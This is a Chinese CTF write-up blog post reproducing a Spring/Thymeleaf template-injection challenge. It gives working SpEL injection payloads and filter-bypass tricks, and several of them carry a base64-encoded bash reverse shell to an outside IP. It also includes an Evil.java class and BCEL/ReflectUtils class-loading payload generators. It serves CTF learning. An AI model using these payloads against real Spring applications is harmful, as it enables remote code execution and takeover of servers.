<!DOCTYPE html>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>
        :root {
            --accent-color: #FF4D4D;
        }
    </style>

    
    
    
    
    
    

    
    <title>近期java赛题复现</title>
    <meta name="description" content="Fortunate enough to get a glimpse of the feast of techiques.">
    <meta name="keywords" content='Web'>

    <meta property="og:url" content="https://kingbridgess.github.io/posts/%E8%BF%91%E6%9C%9Fjava%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/">
    <meta property="og:type" content="website">
    <meta property="og:title" content="近期java赛题复现">
    <meta property="og:description" content="Fortunate enough to get a glimpse of the feast of techiques.">
    <meta property="og:image" content="/images/avatar.jpg">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="近期java赛题复现">
    <meta name="twitter:description" content="Fortunate enough to get a glimpse of the feast of techiques.">
    <meta property="twitter:domain" content="https://kingbridgess.github.io/posts/%E8%BF%91%E6%9C%9Fjava%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/">
    <meta property="twitter:url" content="https://kingbridgess.github.io/posts/%E8%BF%91%E6%9C%9Fjava%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/">
    <meta name="twitter:image" content="/images/avatar.jpg">

    
    <link rel="canonical" href="https://kingbridgess.github.io/posts/%E8%BF%91%E6%9C%9Fjava%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" />

    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/normalize.min.css" media="print" onload="this.media='all'">
    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/main.css">
    <link disabled id="dark-theme" rel="stylesheet" href="https://kingbridgess.github.io/css/dark.css">

    <script src="https://kingbridgess.github.io/js/svg-injector.min.js"></script>
    <script src="https://kingbridgess.github.io/js/feather-icons.min.js"></script>
    <script src="https://kingbridgess.github.io/js/main.js"></script>

    
    
</head>
<body>
        <script type="text/javascript">
            
            setThemeByUserPref();
        </script><header class="header">
    <nav class="header-nav">

        
        <div class="avatar">
            <a href="https://kingbridgess.github.io">
                <img src="https://kingbridgess.github.io/images/avatar.jpg" alt="avatar" />
            </a>
        </div>
        

        <div class="nav-title">
            <a class="nav-brand" href="https://kingbridgess.github.io">BRIdGE</a>
        </div>

        <div class="nav-links">
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/posts/"> Posts </a>
            </div>
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/tags/"> Tags </a>
            </div>
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/about"> About </a>
            </div>
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/contact/"> Contact </a>
            </div>
            
            <div class="nav-link">
                <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
            </div>
            

            <span class="nav-icons-divider"></span>
            <div class="nav-link dark-theme-toggle">
                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
                <a>
                    <span id="theme-toggle-icon" data-feather="moon"></span>
                </a>
            </div>

            <div class="nav-link" id="hamburger-menu-toggle">
                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
                <a>
                    <span data-feather="menu"></span>
                </a>
            </div>

            
            <ul class="nav-hamburger-list visibility-hidden">
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/posts/"> Posts </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/tags/"> Tags </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/about"> About </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/contact/"> Contact </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
                </li>
                
                <li class="nav-item dark-theme-toggle">
                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
                    <a>
                        <span id="theme-toggle-icon" data-feather="moon"></span>
                    </a>
                </li>
            </ul>

        </div>
    </nav>
</header>
<main id="content">
    <div class="post container">
    <div class="post-header-section">
        <h1>近期java赛题复现</h1>
        <small role="doc-subtitle"></small>
        <p class="post-date">
            May 16, 2022
        </p>

        <ul class="post-tags">
        
            <li class="post-tag"><a href="https://kingbridgess.github.io/tags/web">Web</a></li>
        
        </ul>
    </div>

    <div class="post-content">
        <p>
            <h1 id="mini-l-ctf-2022-minispringboot">Mini-L-CTF-2022 minispringboot</h1>
<p>Spring View Manipulation注入，也是基于Thymeleaf的ssti。当时get参数是个?name=xxx，强烈怀疑是注入点，但是没反应。结果路由也是可以注的</p>
<p>可参考 <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#java">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#java</a>  里的 Thymeleaf</p>
<p>这里涉及到SpringEL，这个是用来方便Bean依赖注入的东西。先学一下SpringEL基本语法</p>
<p><a href="https://blog.csdn.net/wb1046329430/article/details/121563724">https://blog.csdn.net/wb1046329430/article/details/121563724</a></p>
<p>值得注意的是，T(xxx)可以引入xxx这个包</p>
<p>本地可以起一个spring测试一下SpringEL Expression</p>
<p>main里写一个类</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> com.example.spel<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.beans.factory.annotation.Autowired<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.beans.factory.annotation.Value<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.stereotype.Component<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>@Component
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">SpringEl</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    @Value<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;#{T(java.lang.Runtime).getRuntime().exec(\&#34;calc\&#34;)}&#34;</span><span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> Object v<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>test里写一个测试类</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> com.example.spel<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.junit.jupiter.api.Test<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.beans.factory.annotation.Autowired<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.boot.test.context.SpringBootTest<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>@SpringBootTest
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Test1</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Autowired
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> SpringEl springEl<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Test
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">test</span><span style="color:#ff79c6">(){</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span>springEl<span style="color:#ff79c6">.</span><span style="color:#50fa7b">v</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>题目过滤了new和runtime，第一种方法（官方的预期）用process builder绕过(下面的payload最后都需要urlencode，为了方便看先不编码)：</p>
<p>另外测试会发现new可以换成New，也可以执行的</p>
<p><code>http://192.168.238.165:49153/__${New ProcessBuilder(&quot;curl xxx.dnslog.cn&quot;).start()}__::.x</code></p>
<p>然后想要弹shell的话，ProcessBuilder里面的命令也是有点学问的，可以参考</p>
<p><a href="https://www.jianshu.com/p/eb41a0291123">https://www.jianshu.com/p/eb41a0291123</a></p>
<p><a href="https://www.jianshu.com/p/ae3922db1f70">https://www.jianshu.com/p/ae3922db1f70</a></p>
<p>按文章的思路，加上本地测试一下构造这个Payload即可弹shell</p>
<p>有一点，payload中有&rsquo;/&lsquo;就会报400错误，要避免这个。</p>
<p><code>http://192.168.238.165:49153/__${New ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMjAxLjE2My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}&quot;).start()}__::.x</code></p>
<p>另外，这题是有很多其他思路的。以下参考了<a href="https://github.com/XDSEC/miniLCTF_2022/blob/main/WriteUps/Flowey/miniLCTF2022wp.md">Flowey大佬们的wp</a></p>
<p>既然字符串被过滤，那么反射forName绕一下就好了(下面payload填在大括号里)</p>
<p><code>&quot;&quot;.getClass().forName(&quot;java.lang.Run&quot;+&quot;time&quot;).getMethod(&quot;exec&quot;, &quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Run&quot;+&quot;time&quot;).getMethod(&quot;getRun&quot;+&quot;time&quot;).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Run&quot;+&quot;time&quot;)),&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMjAxLjE2My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}&quot;)</code></p>
<p>但是没反应。放到上面的@Value测试以下会发现报这个错。</p>
<p><img src="https://s2.loli.net/2022/11/01/M1nuftjxmSHlD2c.png" alt=""></p>
<p>进一步测试，执行curl xxx.dnslog.cn是可行的，直接java运行上面的反射代码也是可行的，但是放在SpringEL里就是不行。（没有进一步debug</p>
<p>另换一个思路，直接动态加载字节码。</p>
<p><a href="https://blog.csdn.net/mole_exp/article/details/122768814">https://blog.csdn.net/mole_exp/article/details/122768814</a></p>
<p>先看一下原生classLoader是怎么加载字节码的</p>
<p>Evil.java(无包名)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.IOException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Evil</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//            String cmd=&#34;gnome-calculator&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            String cmd<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMjAxLjE2My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>            Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getRuntime</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">(</span>cmd<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>IOException e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">test1</span><span style="color:#ff79c6">()</span> <span style="color:#8be9fd;font-style:italic">throws</span>  Exception<span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> evilBytes<span style="color:#ff79c6">=</span> Files<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readAllBytes</span><span style="color:#ff79c6">(</span>Paths<span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/home/remake/IdeaProjects/SringEL/target/classes/Evil.class&#34;</span><span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>        Method defineClass <span style="color:#ff79c6">=</span> ClassLoader<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;defineClass&#34;</span><span style="color:#ff79c6">,</span>String<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[].</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span><span style="color:#8be9fd">int</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span><span style="color:#8be9fd">int</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        defineClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Class Evil <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>Class<span style="color:#ff79c6">)</span>defineClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">invoke</span><span style="color:#ff79c6">(</span>ClassLoader<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getSystemClassLoader</span><span style="color:#ff79c6">(),</span><span style="color:#f1fa8c">&#34;Evil&#34;</span><span style="color:#ff79c6">,</span>evilBytes<span style="color:#ff79c6">,</span>0<span style="color:#ff79c6">,</span>evilBytes<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Evil<span style="color:#ff79c6">.</span><span style="color:#50fa7b">newInstance</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>但是需要<code>defineClass.setAccessible(true);</code>，然而我们的SpringEL表达式只有一行，需要换一种思路</p>
<p>题目是jdk1.8，自带了BCEL ClassLoader，具体可以参考<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">p神的文章</a></p>
<p>先试一下怎么加载</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> com.example.sringel<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Method<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.net.URLEncoder<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.nio.file.Files<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.nio.file.Path<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.nio.file.Paths<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.bcel.internal.classfile.Utility<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">MemTest</span><span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> evilBytes<span style="color:#ff79c6">=</span> Files<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readAllBytes</span><span style="color:#ff79c6">(</span>Paths<span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/home/remake/IdeaProjects/SringEL/target/classes/Evil.class&#34;</span><span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>        runBcelTest<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">runBcelTest</span><span style="color:#ff79c6">()</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> evilBytes<span style="color:#ff79c6">=</span> Files<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readAllBytes</span><span style="color:#ff79c6">(</span>Paths<span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/home/remake/IdeaProjects/SringEL/target/classes/Evil.class&#34;</span><span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>        String bcelCode<span style="color:#ff79c6">=</span>generateBcelCode2<span style="color:#ff79c6">(</span>evilBytes<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        ClassLoader bcelClassLoader <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ClassLoader<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        bcelClassLoader<span style="color:#ff79c6">.</span><span style="color:#50fa7b">loadClass</span><span style="color:#ff79c6">(</span>bcelCode<span style="color:#ff79c6">).</span><span style="color:#50fa7b">newInstance</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> String <span style="color:#50fa7b">generateBcelCode2</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> codes<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        String code <span style="color:#ff79c6">=</span> Utility<span style="color:#ff79c6">.</span><span style="color:#50fa7b">encode</span><span style="color:#ff79c6">(</span>codes<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        String bcelCode <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;$$BCEL$$&#34;</span> <span style="color:#ff79c6">+</span> code<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;bcelcode=&#34;</span> <span style="color:#ff79c6">+</span> bcelCode<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> bcelCode<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>会发现newInstance的时候还是会被waf，所以又得反射绕一下才行。</p>
<p>写一个生成大致payload的脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">BCEL_pay</span><span style="color:#ff79c6">()</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> evilBytes<span style="color:#ff79c6">=</span> Files<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readAllBytes</span><span style="color:#ff79c6">(</span>Paths<span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/home/remake/IdeaProjects/SringEL/target/classes/Evil.class&#34;</span><span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>        String encode<span style="color:#ff79c6">=</span>generateBcelCode2<span style="color:#ff79c6">(</span>evilBytes<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(encode).newInstance();
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        String inside<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;\&#34;\&#34;.getClass().forName(\&#34;java.lang.Class\&#34;).getDeclaredMethod(\&#34;n\&#34;+\&#34;ewInstance\&#34;).invoke(New com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\&#34;&#34;</span><span style="color:#ff79c6">+</span>encode<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;\&#34;))&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        String pay<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;__${&#34;</span><span style="color:#ff79c6">+</span>inside<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;}__::.x&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        pay<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://192.168.238.165:49153/&#34;</span><span style="color:#ff79c6">+</span>URLEncoder<span style="color:#ff79c6">.</span><span style="color:#50fa7b">encode</span><span style="color:#ff79c6">(</span>pay<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span>pay<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>有两个坑点卡了我好久，第一个是forName前如果写成Class.forName，直接丢到前面的@Value是可以通的，但是题目就不行。另一个是java的URLencoder不知怎么把New后面的空格变成了+。但总之这个方法是可以反弹shell的。payload如下(未urlencode)
<code>http://192.168.238.165:49153/__${&quot;&quot;.getClass().forName(&quot;java.lang.Class&quot;).getDeclaredMethod(&quot;n&quot;+&quot;ewInstance&quot;).invoke(New com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(&quot;那一串编码&quot;))}__::.x</code></p>
<p>另外Flowey的师傅用了spring自带的org.springframework.cglib.core.ReflectUtils和org.springframework.util.ClassUtils来加载.原理如下</p>
<p><code>org.springframework.cglib.core.ReflectUtils.defineClass(&quot;Evil&quot;,com.sun.org.apache.xerces.internal.impl.dv.util.HexBin.decode(16进制字节码),org.springframework.util.ClassUtils.getDefaultClassLoader()); </code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">spring_pay</span><span style="color:#ff79c6">()</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> evilBytes<span style="color:#ff79c6">=</span> Files<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readAllBytes</span><span style="color:#ff79c6">(</span>Paths<span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/home/remake/IdeaProjects/SringEL/target/classes/Evil.class&#34;</span><span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>        String encode <span style="color:#ff79c6">=</span> com<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sun</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">org</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">apache</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">xerces</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">internal</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">impl</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">dv</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">util</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">HexBin</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">encode</span><span style="color:#ff79c6">(</span>evilBytes<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        System.out.println(encode);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        String payload<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://192.168.238.165:49153/&#34;</span><span style="color:#ff79c6">+</span> URLEncoder<span style="color:#ff79c6">.</span><span style="color:#50fa7b">encode</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;__${&#34;</span><span style="color:#ff79c6">+</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;T(org.springframework.cglib.core.ReflectUtils).defineClass(\&#34;Evil\&#34;,T(com.sun.org.apache.xerces.internal.impl.dv.util.HexBin).decode(\&#34;&#34;</span><span style="color:#ff79c6">+</span>
</span></span><span style="display:flex;"><span>                encode
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;\&#34;),T(org.springframework.util.ClassUtils).getDefaultClassLoader())&#34;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;}__::.x&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span>payload<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        org.springframework.cglib.core.ReflectUtils.defineClass(&#34;Evil&#34;,com.sun.org.apache.xerces.internal.impl.dv.util.HexBin.decode(encode),org.springframework.util.ClassUtils.getDefaultClassLoader());
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>生成的payload</p>
<p><code>http://192.168.238.165:49153/__${T(org.springframework.cglib.core.ReflectUtils).defineClass(&quot;Evil&quot;,T(com.sun.org.apache.xerces.internal.impl.dv.util.HexBin).decode(&quot;16进制字节码&quot;),T(org.springframework.util.ClassUtils).getDefaultClassLoader())}__::.x</code></p>
<p>也是可以通的</p>
<h1 id="mini-l-ctf-2022-mini-struts2">Mini-L-CTF-2022 Mini Struts2</h1>
<p>结合题目名字和版本可以搜到CVE-2020-17530</p>
